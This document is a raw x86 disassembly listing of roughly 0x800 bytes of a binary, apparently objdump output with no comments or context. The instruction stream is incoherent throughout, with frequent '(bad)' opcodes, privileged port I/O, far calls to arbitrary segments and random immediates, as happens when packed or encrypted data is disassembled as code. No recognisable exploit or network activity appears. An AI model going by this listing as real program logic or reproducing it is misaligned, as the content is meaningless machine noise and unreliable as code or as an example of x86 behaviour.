  415675:	push   0x78
  415677:	test   eax,0xe93b2bb0
  41567c:	popf   
  41567d:	jmp    0x41569c
  41567f:	or     BYTE PTR [edi+0x4d9a0492],dl
  415685:	push   ecx
  415686:	sbb    edx,edi
  415688:	aam    0xae
  41568a:	cmp    BYTE PTR ds:0xa4a448c1,ch
  415690:	push   eax
  415691:	mov    cl,0xc4
  415693:	les    ebp,FWORD PTR [edi-0x11f814dc]
  415699:	dec    ebp
  41569a:	sahf   
  41569b:	add    eax,ecx
  41569d:	ffreep st(3)
  41569f:	inc    edi
  4156a0:	mov    al,0x8d
  4156a2:	fcomi  st,st(2)
  4156a4:	xor    dl,0x10
  4156a7:	ins    DWORD PTR es:[edi],dx
  4156a8:	je     0x4156fd
  4156aa:	cli    
  4156ab:	or     al,0xdd
  4156ad:	(bad)  
  4156ae:	pushf  
  4156af:	aam    0x7
  4156b1:	lds    edi,FWORD PTR [edx]
  4156b3:	mov    BYTE PTR [esi+ebp*4+0x1a7e69c3],dl
  4156ba:	fucomi st,st(0)
  4156bc:	push   edx
  4156bd:	or     dh,BYTE PTR [ebx]
  4156bf:	adc    al,0xe7
  4156c1:	inc    eax
  4156c2:	in     eax,0xa3
  4156c4:	fs popa 
  4156c6:	(bad)  
  4156c7:	sti    
  4156c8:	not    edi
  4156ca:	mov    esi,0x68eb7fbe
  4156cf:	add    eax,0xd9142884
  4156d4:	daa    
  4156d5:	stos   BYTE PTR es:[edi],al
  4156d6:	and    edi,DWORD PTR [edx]
  4156d8:	jecxz  0x4156bb
  4156da:	bound  si,DWORD PTR [esi]
  4156dd:	rcl    BYTE PTR [ecx-0x2c636ab1],0xdb
  4156e4:	ds dec esi
  4156e7:	out    dx,eax
  4156e8:	(bad)  
  4156e9:	or     BYTE PTR [eax],cl
  4156eb:	mov    ah,0x26
  4156ed:	jg     0x415682
  4156ef:	mov    ebp,0xfb940b05
  4156f4:	enter  0x6b9e,0x58
  4156f8:	or     bh,BYTE PTR [edx-0x38]
  4156fb:	test   DWORD PTR [edi+eax*8],esi
  4156fe:	aad    0x1e
  415700:	sbb    al,0x69
  415702:	imul   esp,DWORD PTR [ebx+0x75],0x92172110
  415709:	cdq    
  41570a:	mov    al,ds:0x2cfca9c7
  41570f:	and    al,0xce
  415711:	out    dx,eax
  415712:	push   0x587577e4
  415717:	rcl    BYTE PTR [ebx],0x64
  41571a:	stos   BYTE PTR es:[edi],al
  41571b:	sub    al,0x7a
  41571d:	push   edi
  41571e:	xor    ch,dl
  415720:	ret    
  415721:	(bad)  
  415722:	sbb    esp,DWORD PTR [ebp+0x52]
  415725:	in     al,dx
  415726:	cmp    ah,BYTE PTR [esi]
  415728:	stos   DWORD PTR es:[edi],eax
  415729:	or     ebx,DWORD PTR [ecx]
  41572b:	pop    ebp
  41572c:	mov    ?,WORD PTR [eax+0x1b05a720]
  415732:	popf   
  415733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415734:	xchg   BYTE PTR [esi+0x2c3d35ce],bh
  41573a:	sub    esp,DWORD PTR ds:0xb0309eb8
  415740:	es jl  0x41577e
  415743:	shl    al,0xbb
  415746:	mov    ebx,0x5698e48a
  41574b:	mov    edx,0x8a64cb4b
  415750:	inc    DWORD PTR [edi+0x62f4b3cb]
  415756:	mov    cl,0x71
  415758:	cld    
  415759:	(bad)  
  41575a:	adc    DWORD PTR [edx+0x40727f55],ebp
  415760:	div    ebp
  415762:	hlt    
  415763:	sub    DWORD PTR [ebx-0x2c10f04a],ebx
  415769:	push   edi
  41576a:	popf   
  41576b:	test   DWORD PTR [esi+0x63db3c42],eax
  415771:	xlat   BYTE PTR ds:[ebx]
  415772:	int3   
  415773:	xor    DWORD PTR [eax],0xab685fc2
  415779:	and    BYTE PTR [ebx],ah
  41577b:	adc    DWORD PTR [esi-0x3665c3f3],0x5f
  415782:	ror    BYTE PTR [edx],0xb0
  415785:	out    dx,al
  415786:	jg     0x4157cb
  415788:	ss std 
  41578a:	and    ah,ch
  41578c:	xchg   edi,eax
  41578d:	not    esi
  41578f:	sub    BYTE PTR [ecx-0x45],bl
  415792:	push   esi
  415793:	pop    ss
  415794:	jbe    0x4157b9
  415796:	mov    DWORD PTR [esi-0x20ceaebe],ebx
  41579c:	rcl    BYTE PTR [ecx+0x7435f9e9],cl
  4157a2:	push   ecx
  4157a3:	mov    esi,0x30c9d411
  4157a8:	jb     0x41580d
  4157aa:	in     al,dx
  4157ab:	or     ch,0xb1
  4157ae:	or     DWORD PTR [ebp+ebp*2-0x50],esp
  4157b2:	xor    esi,esi
  4157b4:	mov    ah,0xc2
  4157b6:	ja     0x41576a
  4157b8:	sub    bl,BYTE PTR [ebp-0x15009f7c]
  4157be:	repz fneni(8087 only) 
  4157c1:	popf   
  4157c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157c3:	mov    ds:0x25aa0f7f,eax
  4157c8:	les    ecx,FWORD PTR [eax+0x795a8c29]
  4157ce:	xor    DWORD PTR fs:[ecx+0x3a],edi
  4157d2:	leave  
  4157d3:	jl     0x41583f
  4157d5:	shl    BYTE PTR [edx+0x24fdb16c],0xd4
  4157dc:	in     eax,dx
  4157dd:	(bad)  
  4157de:	xor    ebp,ecx
  4157e0:	pop    es
  4157e1:	mov    edx,0xe628ed64
  4157e6:	push   esi
  4157e7:	sub    dl,0xaf
  4157ea:	hlt    
  4157eb:	aas    
  4157ec:	xchg   bl,ch
  4157ee:	xor    DWORD PTR [eax+0x6f],esi
  4157f1:	call   0xc2e38646
  4157f6:	and    DWORD PTR ds:0x422c66d5,ecx
  4157fc:	stos   DWORD PTR es:[edi],eax
  4157fd:	shl    cl,0xd9
  415800:	mov    BYTE PTR ds:0x8e1a25f3,dl
  415806:	mov    edi,DWORD PTR [eax]
  415808:	sub    cl,BYTE PTR [esi+0x194a194]
  41580e:	mov    eax,0x7ce29241
  415813:	xchg   edi,eax
  415814:	cmp    al,0x4e
  415816:	inc    edx
  415817:	es and al,0x1c
  41581a:	xchg   edi,eax
  41581b:	fnsave [ebp+0x547f81b6]
  415821:	sti    
  415822:	push   cs
  415823:	inc    esp
  415824:	dec    ebp
  415825:	mov    bh,ah
  415827:	es dec ebp
  415829:	lods   eax,DWORD PTR ds:[esi]
  41582a:	xor    BYTE PTR [esi-0x6],al
  41582d:	loope  0x415814
  41582f:	sub    ah,BYTE PTR [esi-0x1083f191]
  415835:	xor    edx,DWORD PTR [eax]
  415837:	mov    ch,0xe1
  415839:	lahf   
  41583a:	cmp    dh,al
  41583c:	shr    dh,1
  41583e:	adc    BYTE PTR [ebp-0x584f7d66],cl
  415844:	xor    ebx,DWORD PTR [ecx+0x48d4aa88]
  41584a:	mov    cl,0x30
  41584c:	mov    eax,ds:0xd8ff2ba5
  415851:	jecxz  0x415862
  415853:	inc    ebp
  415854:	mov    ebx,ss
  415856:	lahf   
  415857:	jo     0x415824
  415859:	mov    ds:0xb86c73ad,al
  41585e:	inc    ebx
  41585f:	sbb    al,0xb6
  415861:	cmp    DWORD PTR [edx+eax*4+0x2b429be5],esp
  415868:	or     ah,dl
  41586a:	pop    esi
  41586b:	xchg   ebx,eax
  41586c:	inc    DWORD PTR [eax-0x2479bae5]
  415872:	cs add bl,cl
  415875:	in     al,dx
  415876:	and    BYTE PTR [esi],ch
  415878:	enter  0xffb2,0x7b
  41587c:	out    dx,al
  41587d:	bound  ebp,QWORD PTR [esi+0x41]
  415880:	mov    dh,0x1f
  415882:	sub    ch,BYTE PTR [esp+eax*4]
  415885:	jmp    0x415902
  415887:	adc    eax,0xe0a227b2
  41588c:	into   
  41588d:	adc    dl,dl
  41588f:	sbb    al,0xb
  415891:	int3   
  415892:	mov    esi,0xdb4012e9
  415897:	mov    dh,0xe4
  415899:	pop    ss
  41589a:	test   al,dh
  41589c:	push   ebp
  41589d:	add    DWORD PTR [edi+ecx*2+0x22],esi
  4158a1:	push   edx
  4158a2:	jne    0x4158c4
  4158a4:	cmp    dh,BYTE PTR [eax-0x58]
  4158a7:	lds    esp,FWORD PTR [edx+0x6ebdbded]
  4158ad:	retf   0x6bd6
  4158b0:	xor    DWORD PTR [eax],ecx
  4158b2:	jl     0x41591f
  4158b4:	or     dh,bh
  4158b6:	adc    DWORD PTR [edi],ecx
  4158b8:	bound  ebx,QWORD PTR [ebp+0x7cbad7cf]
  4158be:	or     ch,ch
  4158c0:	pop    ds
  4158c1:	loopne 0x4158c7
  4158c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158c4:	fidiv  DWORD PTR [ebx]
  4158c6:	jo     0x4158d2
  4158c8:	mov    ecx,eax
  4158ca:	ret    0x417a
  4158cd:	inc    esp
  4158ce:	inc    esi
  4158cf:	into   
  4158d0:	mov    edx,0xfbba0ae8
  4158d5:	pop    esp
  4158d6:	pop    ebp
  4158d7:	jp     0x415907
  4158d9:	rcl    DWORD PTR [ecx+0x76],cl
  4158dc:	loope  0x41587d
  4158de:	push   es
  4158df:	add    BYTE PTR [eax-0x36],al
  4158e2:	in     al,0xd7
  4158e4:	xor    ecx,DWORD PTR [esi]
  4158e6:	jae    0x41592b
  4158e8:	imul   esi,DWORD PTR [edx+ebp*8],0x74c92947
  4158ef:	pop    ecx
  4158f0:	jo     0x4158aa
  4158f2:	adc    ch,BYTE PTR [ecx]
  4158f4:	cld    
  4158f5:	shr    BYTE PTR [esi+0x24dca107],1
  4158fb:	enter  0x23c8,0x5c
  4158ff:	xchg   ebx,eax
  415900:	xchg   esi,eax
  415901:	fstp   st(7)
  415903:	xchg   esp,eax
  415904:	xlat   BYTE PTR ds:[ebx]
  415905:	sahf   
  415906:	jns    0x4158e1
  415908:	loop   0x415961
  41590a:	dec    esp
  41590b:	mov    esi,0xdcbd017d
  415910:	add    esp,DWORD PTR [esi+0x1f]
  415913:	ret    
  415914:	xchg   esp,eax
  415915:	or     al,ch
  415917:	sub    ebx,ebp
  415919:	std    
  41591a:	push   ecx
  41591b:	addr16 lahf 
  41591d:	or     DWORD PTR [ebx],edi
  41591f:	mov    edx,0x287e2775
  415924:	inc    esp
  415925:	das    
  415926:	and    al,BYTE PTR cs:[eax]
  415929:	ins    DWORD PTR es:[edi],dx
  41592a:	xor    dh,BYTE PTR [edi]
  41592c:	and    al,0x6a
  41592e:	xor    DWORD PTR [ebx],esp
  415930:	ret    0x21f6
  415933:	jno    0x415993
  415935:	add    eax,0xa8e5b6e8
  41593a:	loopne 0x415934
  41593c:	pop    ecx
  41593d:	outs   dx,BYTE PTR ds:[esi]
  41593e:	or     BYTE PTR [esi],bl
  415940:	xchg   DWORD PTR [ebp+0x65],eax
  415943:	lea    eax,[eax]
  415945:	in     eax,dx
  415946:	dec    edi
  415947:	sub    dl,0xc
  41594a:	psllw  mm5,QWORD PTR [ecx]
  41594d:	or     ebx,DWORD PTR [eax]
  41594f:	jp     0x41594f
  415951:	loop   0x415963
  415953:	mov    edx,0x70564f5f
  415958:	retf   0x9db8
  41595b:	mov    dh,0xbf
  41595d:	mov    BYTE PTR [ecx],bl
  41595f:	pop    ebp
  415960:	hlt    
  415961:	jl     0x41593a
  415963:	js     0x41595e
  415965:	test   BYTE PTR [eax],cl
  415967:	cmp    eax,0x6f29dbae
  41596c:	shl    BYTE PTR [eax-0x1d1dd0d],0x90
  415973:	sub    esi,DWORD PTR ds:0xf38ad1ce
  415979:	sub    ebx,0xe9611760
  41597f:	mov    gs,WORD PTR [ebp+0x3eb807ad]
  415985:	dec    ecx
  415986:	(bad)  
  415987:	push   ebx
  415988:	sbb    eax,0xc7c98a18
  41598d:	mov    al,ch
  41598f:	mov    DWORD PTR [ebx],esi
  415991:	cmp    ebx,0xffffffa6
  415994:	dec    esi
  415995:	stc    
  415996:	pop    ds
  415997:	fldcw  WORD PTR [edx]
  415999:	xchg   DWORD PTR [edx+esi*2-0x39],ebp
  41599d:	ret    
  41599e:	lea    esp,[esp+ebx*1-0x638e7e8a]
  4159a5:	(bad)  
  4159a6:	jge    0x4159ee
  4159a8:	out    0x76,eax
  4159aa:	bound  edi,QWORD PTR [ebx]
  4159ac:	inc    ebp
  4159ad:	jb     0x415966
  4159af:	push   0xffffff80
  4159b1:	jns    0x41599b
  4159b3:	mov    ebp,0xc23a43af
  4159b8:	mov    ch,0x74
  4159ba:	jl     0x415a1e
  4159bc:	sub    ebx,DWORD PTR [eax+0x10]
  4159bf:	mov    al,ds:0xe9686323
  4159c4:	ror    BYTE PTR [esi+0x5c34b65],cl
  4159ca:	xchg   ecx,eax
  4159cb:	leave  
  4159cc:	adc    ch,BYTE PTR [edx+0x2dd311f8]
  4159d2:	jle    0x4159a9
  4159d4:	add    ch,al
  4159d6:	xchg   ebx,eax
  4159d7:	and    al,0x24
  4159d9:	pop    ebp
  4159da:	xlat   BYTE PTR ds:[ebx]
  4159db:	out    0xc4,eax
  4159dd:	sbb    ebp,DWORD PTR ds:0x2d09b54
  4159e3:	jo     0x4159c0
  4159e5:	call   0x3361:0x36186c2f
  4159ec:	lahf   
  4159ed:	mov    bl,0xeb
  4159ef:	and    dl,bl
  4159f1:	pop    ecx
  4159f2:	push   esp
  4159f3:	xchg   ebx,eax
  4159f4:	xchg   DWORD PTR [ebx+0x111a3d87],ebp
  4159fa:	test   al,0xf8
  4159fc:	(bad)  
  4159fd:	ins    BYTE PTR es:[edi],dx
  4159fe:	jb     0xb9e13ab2
  415a04:	jns    0x41599b
  415a06:	xor    edx,DWORD PTR [ecx-0x63469543]
  415a0c:	stc    
  415a0d:	add    al,BYTE PTR [ecx+0x63]
  415a10:	dec    edi
  415a11:	out    dx,eax
  415a12:	sahf   
  415a13:	xchg   ebp,eax
  415a14:	into   
  415a15:	jmp    0x415a76
  415a17:	or     al,0xf1
  415a19:	xor    BYTE PTR [ebx+edx*8-0x60],cl
  415a1d:	mov    dl,0x4d
  415a1f:	repz add eax,0x8f9074e5
  415a25:	(bad)  [eax]
  415a27:	jp     0x4159f6
  415a29:	(bad)  
  415a2b:	aam    0x2d
  415a2d:	leave  
  415a2e:	xlat   BYTE PTR ds:[ebx]
  415a2f:	dec    eax
  415a30:	sub    BYTE PTR [edi-0x5d],0xc2
  415a34:	or     eax,0x13319d6d
  415a39:	cmp    eax,0x9bbf2c0b
  415a3e:	jecxz  0x415a0c
  415a40:	(bad)  
  415a41:	mov    ebx,0x12fc4cdd
  415a46:	jo     0x415a4b
  415a48:	je     0x415a95
  415a4a:	or     BYTE PTR [edx+0x55f5947c],0xaa
  415a51:	push   eax
  415a52:	pop    edi
  415a53:	xor    al,BYTE PTR [edi]
  415a55:	or     ch,BYTE PTR [edi-0xce79356]
  415a5b:	out    dx,al
  415a5c:	nop
  415a5d:	jle    0x415aa0
  415a5f:	jl     0x415a84
  415a61:	icebp  
  415a62:	xchg   edi,eax
  415a63:	shr    DWORD PTR [ecx],1
  415a65:	xor    BYTE PTR [eax+ebp*8+0x30],dl
  415a69:	mov    fs,WORD PTR [eax+0x5fd72e2a]
  415a6f:	daa    
  415a70:	mov    ecx,0x1a887d07
  415a75:	add    DWORD PTR [edx+esi*2+0x45],0xffffff85
  415a7a:	adc    eax,0xabbd90fb
  415a7f:	or     eax,0x6ef47f65
  415a84:	imul   ebx,DWORD PTR ds:0x70fba64a,0xffffffcc
  415a8b:	add    al,0xfb
  415a8d:	cmp    al,al
  415a8f:	add    edi,eax
  415a91:	repnz pop edx
  415a93:	pop    ecx
  415a94:	jns    0x415a2a
  415a96:	ins    DWORD PTR es:[edi],dx
  415a97:	outs   dx,BYTE PTR ds:[esi]
  415a98:	cmp    eax,0xa1dfe470
  415a9d:	out    0x41,al
  415a9f:	cdq    
  415aa0:	hlt    
  415aa1:	sbb    al,0x9c
  415aa3:	mov    cl,BYTE PTR [edi-0xf5eb5a7]
  415aa9:	add    esi,esi
  415aab:	sub    edi,DWORD PTR [ecx-0x4c]
  415aae:	(bad)  
  415aaf:	sbb    ebp,DWORD PTR [edx]
  415ab1:	mov    ch,0xad
  415ab3:	jo     0x415a97
  415ab5:	ret    0xd2d0
  415ab8:	xchg   edx,eax
  415ab9:	mov    dh,bl
  415abb:	in     eax,dx
  415abc:	call   0x16a:0x79c0c865
  415ac3:	inc    esp
  415ac4:	int3   
  415ac5:	sbb    DWORD PTR [eax],esi
  415ac7:	dec    ebp
  415ac8:	xchg   ebx,eax
  415ac9:	jmp    0x54903257
  415ace:	push   edi
  415acf:	test   al,0xe5
  415ad1:	push   ds
  415ad2:	mov    eax,0x3df9cabc
  415ad7:	fnstsw WORD PTR [ebx-0x53]
  415ada:	mov    ds:0x525d3915,eax
  415adf:	sub    eax,eax
  415ae1:	jg     0x415b1e
  415ae3:	retf   0xfedb
  415ae6:	sub    eax,0x6fdf4ec8
  415aeb:	call   0x7951:0x4cf7828a
  415af2:	bnd ret 0x3384
  415af6:	or     al,0x62
  415af8:	inc    esp
  415af9:	bound  esp,QWORD PTR [ebx-0x66810ae1]
  415aff:	loop   0x415ac5
  415b01:	add    cl,bl
  415b03:	mov    esi,0x33fa3e91
  415b08:	ret    0x85c8
  415b0b:	or     al,0xfe
  415b0d:	mov    ch,BYTE PTR [esi]
  415b0f:	push   edx
  415b10:	pop    edx
  415b11:	adc    esi,DWORD PTR [esi]
  415b13:	into   
  415b14:	test   eax,edi
  415b16:	ret    0xf03d
  415b19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b1a:	and    ebx,DWORD PTR [edi+0x2fcdcac5]
  415b20:	mov    esi,DWORD PTR [esi-0xbfd0458]
  415b26:	jns    0x415b60
  415b28:	sub    eax,0x23e1ba77
  415b2d:	sbb    DWORD PTR [esp+edi*4-0x4526cf],edi
  415b34:	adc    DWORD PTR [ebx+0x59c91d22],0xebcc6fea
  415b3e:	shr    BYTE PTR [ebx+0x584b0467],1
  415b44:	mov    bl,0x3a
  415b46:	push   esp
  415b47:	jmp    0x2e1c:0x4a31b43a
  415b4e:	lahf   
  415b4f:	and    DWORD PTR ss:[esp+ebp*2-0x3e],edx
  415b54:	je     0x415afa
  415b56:	arpl   WORD PTR [ecx+0x56],di
  415b59:	add    al,0xe1
  415b5b:	stos   BYTE PTR es:[edi],al
  415b5c:	ins    BYTE PTR es:[edi],dx
  415b5d:	cmp    eax,0xfbb31c83
  415b62:	push   edx
  415b63:	pop    es
  415b64:	cdq    
  415b65:	int    0x84
  415b67:	test   BYTE PTR [ecx-0x1cec78a],0xbb
  415b6e:	nop
  415b6f:	sub    al,0xd9
  415b71:	lahf   
  415b72:	stos   BYTE PTR es:[edi],al
  415b73:	mov    DWORD PTR [edx-0x17],edi
  415b76:	fdiv   QWORD PTR [edi]
  415b78:	xor    edx,DWORD PTR [edx+0x7bf7f1ad]
  415b7e:	adc    al,0xd3
  415b80:	add    al,0xb2
  415b82:	cwde   
  415b83:	jne    0x415be0
  415b85:	adc    bh,BYTE PTR [ecx-0x2e]
  415b88:	fdiv   QWORD PTR [edx]
  415b8a:	ss dec esi
  415b8c:	scas   eax,DWORD PTR es:[edi]
  415b8d:	leave  
  415b8e:	mov    esp,0x3c60ce1b
  415b93:	test   BYTE PTR [ebx+0x3052a6b7],dl
  415b99:	iret   
  415b9a:	push   ebp
  415b9b:	push   0xffffffe8
  415b9d:	pop    esp
  415b9e:	mov    dh,0xe
  415ba0:	pop    es
  415ba1:	lea    esi,[eax+0x7aa32386]
  415ba7:	lock sbb eax,0x1b336b1d
  415bad:	pop    ecx
  415bae:	imul   eax,DWORD PTR [eax-0x44a530d8],0xa7ec72a3
  415bb8:	adc    BYTE PTR [ebx+0xf1f1da8],ch
  415bbe:	jp     0x415b63
  415bc0:	lods   al,BYTE PTR ds:[esi]
  415bc1:	mov    edi,DWORD PTR [ecx]
  415bc3:	xchg   ecx,eax
  415bc4:	jmp    0xb741908d
  415bc9:	sub    eax,0x12742d11
  415bce:	int    0x2a
  415bd0:	int3   
  415bd1:	mov    ch,BYTE PTR [eax-0x2b]
  415bd4:	jne    0x415bc8
  415bd6:	sbb    DWORD PTR [ebx+0x5f6a6fea],0x1c
  415bdd:	inc    edi
  415bde:	inc    esi
  415bdf:	ins    BYTE PTR es:[edi],dx
  415be0:	dec    edx
  415be1:	mov    esi,?
  415be3:	mov    ah,0xbc
  415be5:	adc    BYTE PTR [edx+0x74],0xfb
  415be9:	xchg   ebx,eax
  415bea:	and    eax,edi
  415bec:	rcl    DWORD PTR [eax],cl
  415bee:	push   edx
  415bef:	cld    
  415bf0:	out    dx,eax
  415bf1:	pop    es
  415bf2:	push   edi
  415bf3:	adc    DWORD PTR [edx+0x4c],ebx
  415bf6:	or     cl,al
  415bf8:	xchg   ebp,eax
  415bf9:	add    ecx,esi
  415bfb:	or     eax,DWORD PTR [eax+0x67ea4dea]
  415c01:	mul    DWORD PTR [ebp+0x9]
  415c04:	in     eax,0xa4
  415c06:	cld    
  415c07:	cld    
  415c08:	cmp    BYTE PTR [ebx+0x22ffcb1a],al
  415c0e:	idiv   BYTE PTR [ebp+ebx*4+0x24700151]
  415c15:	shl    DWORD PTR [edx+edx*8],cl
  415c18:	or     eax,0xedf76fae
  415c1d:	lds    ebx,FWORD PTR [eax-0x13]
  415c20:	scas   eax,DWORD PTR es:[edi]
  415c21:	mov    cs,edx
  415c23:	sub    eax,0x4f8f29d1
  415c28:	mov    esp,0x146c1b4b
  415c2d:	cld    
  415c2e:	in     al,dx
  415c2f:	sti    
  415c30:	dec    ebx
  415c31:	cmp    eax,0x759201c6
  415c36:	sub    al,0x27
  415c38:	pop    ebx
  415c39:	push   es
  415c3a:	xchg   BYTE PTR [edi+0x4d1f3072],ch
  415c40:	fcom   DWORD PTR [esi]
  415c42:	popa   
  415c43:	pusha  
  415c44:	add    eax,0x83b12ac3
  415c49:	mov    al,0xb3
  415c4b:	jno    0x415cc8
  415c4d:	mov    BYTE PTR [edi+0x25],dh
  415c50:	pop    edi
  415c51:	jmp    0x415cb6
  415c53:	push   es
  415c54:	loopne 0x415caf
  415c56:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  415c58:	inc    BYTE PTR [esi-0x61]
  415c5b:	mov    eax,ds:0x3eb2229a
  415c60:	in     al,0x33
  415c62:	add    DWORD PTR [ecx-0x4a],0x17
  415c66:	and    DWORD PTR [edx-0x5f],esp
  415c69:	clc    
  415c6a:	pop    ebp
  415c6b:	(bad)  
  415c6c:	call   0x2271:0x2d01d80d
  415c73:	cmc    
  415c74:	out    dx,eax
  415c75:	push   0x8e359a2b
  415c7a:	fstp   st(7)
  415c7c:	pusha  
  415c7d:	data16 lock scas al,BYTE PTR es:[edi]
  415c80:	out    0x5c,eax
  415c82:	mov    edi,DWORD PTR [ecx+0x6c38c3d6]
  415c88:	fldcw  WORD PTR [edx-0x68]
  415c8b:	ret    
  415c8c:	test   al,0xeb
  415c8e:	adc    BYTE PTR [eax-0x43],cl
  415c91:	inc    edi
  415c92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c93:	aad    0x96
  415c95:	loop   0x415c27
  415c97:	mov    bl,0xa9
  415c99:	mov    WORD PTR [ebx+0x22bc2444],?
  415c9f:	std    
  415ca0:	pusha  
  415ca1:	retf   
  415ca2:	das    
  415ca3:	enter  0xec5d,0x38
  415ca7:	mov    dl,0x1a
  415ca9:	xor    BYTE PTR [eax-0x42],dh
  415cac:	ss and eax,0x60e317ff
  415cb2:	sub    eax,0xb8841d79
  415cb7:	shl    BYTE PTR [edi+0x4314dde9],1
  415cbd:	adc    al,0x8f
  415cbf:	mov    edx,0x29c78816
  415cc4:	adc    BYTE PTR [eax],dh
  415cc6:	fidiv  WORD PTR [edx-0x174838ae]
  415ccc:	test   al,0xd7
  415cce:	fild   DWORD PTR [ecx]
  415cd0:	(bad)  
  415cd1:	mov    ebx,ebp
  415cd3:	out    0x19,eax
  415cd5:	sub    ah,BYTE PTR [ebx+0x68318718]
  415cdb:	cdq    
  415cdc:	xor    al,0x93
  415cde:	mov    ds:0x1475caf1,eax
  415ce3:	jae    0x415d4b
  415ce5:	data16 and BYTE PTR [edi],cl
  415ce8:	push   ecx
  415ce9:	jno    0x415d02
  415ceb:	pop    ds
  415cec:	mov    eax,0xeb65b31d
  415cf1:	pop    ds
  415cf2:	pop    edi
  415cf3:	mov    esp,0xa2b8ebbf
  415cf8:	xchg   esi,eax
  415cf9:	sbb    DWORD PTR [edi],ebx
  415cfb:	dec    ecx
  415cfc:	push   edx
  415cfd:	popa   
  415cfe:	(bad)  
  415cff:	jne    0x415d45
  415d01:	call   0x155a798f
  415d06:	xchg   esi,eax
  415d07:	pop    ebx
  415d08:	(bad)  
  415d09:	sub    DWORD PTR ds:0x447c8479,esi
  415d0f:	inc    eax
  415d10:	mov    DWORD PTR [esi],0x1bb73f21
  415d16:	push   esp
  415d17:	xor    edi,DWORD PTR [ebp-0x4a2f1995]
  415d1d:	stos   DWORD PTR es:[edi],eax
  415d1e:	jecxz  0x415cd3
  415d20:	loopne 0x415cb2
  415d22:	inc    esi
  415d23:	das    
  415d24:	leave  
  415d25:	adc    BYTE PTR [ecx-0x57],0x3d
  415d29:	inc    esi
  415d2a:	dec    ebp
  415d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d2c:	fld    TBYTE PTR [ebx]
  415d2e:	retf   0x768b
  415d31:	jb     0x415d6e
  415d33:	gs in  ax,0x25
  415d37:	mov    ah,0xd7
  415d39:	ret    0x8df2
  415d3c:	cmp    al,0xd2
  415d3e:	loop   0x415cd6
  415d40:	arpl   WORD PTR [ebx-0x51],bp
  415d43:	sub    al,0xad
  415d45:	inc    ecx
  415d46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d47:	aad    0xb
  415d49:	test   DWORD PTR [eax+0x63e1e9b2],0xf57f4aa9
  415d53:	shr    al,cl
  415d55:	es push esp
  415d57:	sub    bl,BYTE PTR [ebp+0x192b31e1]
  415d5d:	or     DWORD PTR [ebp-0x29785569],edx
  415d63:	sahf   
  415d64:	push   DWORD PTR [ebp+0x51]
  415d67:	in     al,0xa2
  415d69:	ror    DWORD PTR [esi+0x1541d9aa],1
  415d6f:	and    cl,BYTE PTR [edx]
  415d71:	jae    0x415d38
  415d73:	mov    eax,0x7234a838
  415d78:	sub    BYTE PTR [ebx-0x3850df8b],bl
  415d7e:	mov    eax,0x4f12faa3
  415d83:	adc    edx,DWORD PTR [ebx-0x458c2504]
  415d89:	sbb    BYTE PTR [edi+0x7915a786],ah
  415d8f:	mov    ebp,esp
  415d91:	retf   0x8af8
  415d94:	mov    ds:0x61d2f3a,eax
  415d99:	lods   al,BYTE PTR ds:[esi]
  415d9a:	jl     0x415d49
  415d9c:	out    dx,eax
  415d9d:	jmp    0x45403cfb
  415da2:	mov    ecx,0x5bce0e66
  415da7:	or     al,0xf7
  415da9:	mov    dx,0x66e5
  415dad:	or     dl,cl
  415daf:	cmc    
  415db0:	hlt    
  415db1:	and    ebx,edx
  415db3:	aad    0x16
  415db5:	sbb    BYTE PTR [eax-0x33],ah
  415db8:	fxtract 
  415dba:	les    ebx,FWORD PTR ds:0xfeb40ea2
  415dc0:	out    dx,eax
  415dc1:	push   esp
  415dc2:	mov    ah,0x1
  415dc4:	popf   
  415dc5:	mov    esi,ebp
  415dc7:	ret    
  415dc8:	mov    bh,0x33
  415dca:	or     eax,0xa4b3c82b
  415dcf:	stos   BYTE PTR es:[edi],al
  415dd0:	dec    esi
  415dd1:	xor    eax,0x504c547a
  415dd6:	clc    
  415dd7:	outs   dx,DWORD PTR ds:[esi]
  415dd8:	push   ebp
  415dd9:	and    BYTE PTR [ebp-0x3b],0xb5
  415ddd:	dec    ecx
  415dde:	fsub   DWORD PTR [edi+esi*1-0x7d]
  415de2:	cli    
  415de3:	pop    edx
  415de4:	inc    eax
  415de5:	rcr    DWORD PTR [ebp+0x62],0x4
  415de9:	push   edi
  415dea:	lods   al,BYTE PTR ds:[esi]
  415deb:	out    dx,al
  415dec:	jle    0x415d76
  415dee:	shl    DWORD PTR [ebp-0x33cf92b8],cl
  415df4:	test   eax,0x5b550b96
  415df9:	popa   
  415dfa:	lea    ecx,[edi-0x5b]
  415dfd:	lods   al,BYTE PTR ds:[esi]
  415dfe:	mov    DWORD PTR [esi],0x18edbca3
  415e04:	xor    ebp,DWORD PTR [ebp-0x4aa34500]
  415e0a:	or     DWORD PTR [edi-0x46],ebp
  415e0d:	jb     0x415e1e
  415e0f:	and    dl,al
  415e11:	ja     0x415e09
  415e13:	add    dl,al
  415e15:	call   0xf65dcd44
  415e1a:	in     eax,dx
  415e1b:	adc    eax,0xb53caf2c
  415e20:	sahf   
  415e21:	sbb    eax,0xa6a4a6e
  415e26:	xor    eax,0x368b579c
  415e2b:	pop    edi
  415e2c:	pop    edi
  415e2d:	clc    
  415e2e:	xchg   ecx,ebx
  415e30:	push   0xb2ee55d3
  415e35:	mov    ah,0x1d
  415e37:	dec    eax
  415e38:	xchg   edi,eax
  415e39:	ss ret 0x5d16
  415e3d:	(bad)  
  415e3e:	pop    ebp
  415e3f:	xor    ecx,DWORD PTR [edx+0x59a27637]
  415e45:	push   ss
  415e46:	ja     0x415e83
  415e48:	cmp    eax,DWORD PTR [edx]
  415e4a:	inc    BYTE PTR [esi]
  415e4c:	mov    ebx,DWORD PTR [ebp+0x10]
  415e4f:	inc    edi
  415e50:	ja     0x415e01
  415e52:	adc    BYTE PTR [edi+0x17],ah
  415e55:	call   0x2388c2b6
  415e5a:	push   ds
  415e5b:	lock cmp ah,BYTE PTR ds:0xf69570fe
  415e62:	ret    0x16fa
  415e65:	fimul  DWORD PTR [ebx-0x7ec88432]
  415e6b:	mov    edx,0xac27ba1e
  415e70:	cli    
  415e71:	or     bh,BYTE PTR [edi+0x28]
  415e74:	out    dx,al
  415e75:	pop    esp
